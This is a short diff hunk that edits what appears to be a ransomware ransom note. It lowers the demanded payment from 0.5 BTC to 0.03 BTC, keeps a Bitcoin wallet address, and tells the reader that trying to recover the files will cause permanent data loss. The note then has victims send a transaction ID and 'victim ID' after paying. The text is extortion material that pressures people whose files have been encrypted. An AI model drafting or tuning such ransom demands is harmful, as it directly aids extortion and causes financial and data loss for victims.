@@ -165,7 +165,7 @@ Trying to recover files yourself will cause permanent data loss.
 
 How do I pay?
 -------------
-Send 0.5 BTC to this address:
+Send 0.03 BTC to this address:
 bc1qwc0d85qsu8rct9rzwrpqltdwpstu4j9mltx89d
 
 After payment, send your transaction ID and victim ID to:
